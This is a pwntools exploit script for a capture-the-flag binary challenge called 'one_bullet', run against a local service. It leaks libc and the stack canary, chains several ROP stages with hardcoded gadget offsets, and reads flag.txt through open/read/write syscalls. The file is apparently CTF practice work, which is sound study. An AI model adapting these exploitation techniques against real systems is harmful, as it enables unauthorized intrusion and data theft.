from pwn import *
from exploit import *

libc = ELF('./dist/libc-2.31.so')
context.arch = 'amd64'

p = exploit_source("./dist/one_bullet.o", "nc localhost 13027")
# p = remote("localhost", 13500)

p.recvuntil("here's a bullet: ")
system = int(p.recvline()[:-1], 16)
libc.address = system - libc.symbols['system']
success(f"{hex(libc.address) = }")

p.recvuntil("cocking the gun...\n")
p.send(p64(libc.address - 10392))
canary = u64(p.recvn(8))
success(f"{hex(canary) = }")

p.recvuntil("fire! i bet u will miss tho...\n")

mov_edx_7f_gadget = libc.address + 0xe816a
p.send(p64(0) + p64(canary) + p64(0) + p64(mov_edx_7f_gadget) + p64(libc.symbols['__read_nocancel'])) # call read(0, buf, 0x7f), to build a bigger ROP

# From https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
pop_rdi = libc.address + 0x26b72
pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
push_rax = libc.address + 0x45197
pop_rax = libc.address + 0x4a550
xchg_eax_edi = libc.address + 0x2ad2b
syscall_ret = libc.address + 0x66229
setcontext_gadget = libc.address + 0x580DD
call_gadget = libc.address + 0x154930


p.send(flat({0x28: p64(pop_rdx_r12) + p64(0x200) + p64(0) + p64(libc.symbols['__read_nocancel'])}, length=0x7f)) # call read(0, buf, 0x1000), build a even bigger ROP

flag_path_rw = libc.symbols['__free_hook'] # doesnt have to be free hook lol, just need some rw memory inside libc
flat_text_rw = flag_path_rw + 0x50 
rop = ROP(libc)
rop.read(0, flag_path_rw, 0x20) 
rop.open(flag_path_rw, 0)
rop.read(3, flat_text_rw, 0x100)
rop.write(1, flat_text_rw, 0x100)
print(rop.dump())
raw = rop.chain()

p.send(flat({0x48: raw}, length=0x200))
p.send(flat({0: "flag.txt\0"}, length=0x20))

p.interactive()